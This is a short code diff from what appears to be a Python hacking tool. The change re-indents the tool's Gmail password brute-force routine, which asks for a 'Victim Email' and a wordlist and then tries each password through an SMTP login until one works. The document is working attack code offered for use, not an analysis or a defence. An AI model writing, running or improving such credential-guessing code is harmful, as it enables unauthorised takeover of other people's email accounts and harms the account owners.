@@ -1,5 +1,3 @@
-#import modules
-
 from googlesearch import search
 from colorama import Fore, init
 init()
@@ -127,12 +125,11 @@ if option==9:
 	user = input("Type Victim Email: ")
 	Wordlist = input("Type here your Wordlist: ")
 	passwfile = open(Wordlist, "r")
+	for password in passwfile:
+		try:
+			gmail_server.login(user, password)
 
-for password in passwfile:
-	try:
-		gmail_server.login(user, password)
-
-		print("[+] Password Found: %s" % password)
-		break;
-	except smtplib.SMTPAuthenticationError:
-		print ("[!] Password Incorrect: %s" % password)
+			print("[+] Password Found: %s" % password)
+			break;
+		except smtplib.SMTPAuthenticationError:
+			print ("[!] Password Incorrect: %s" % password)
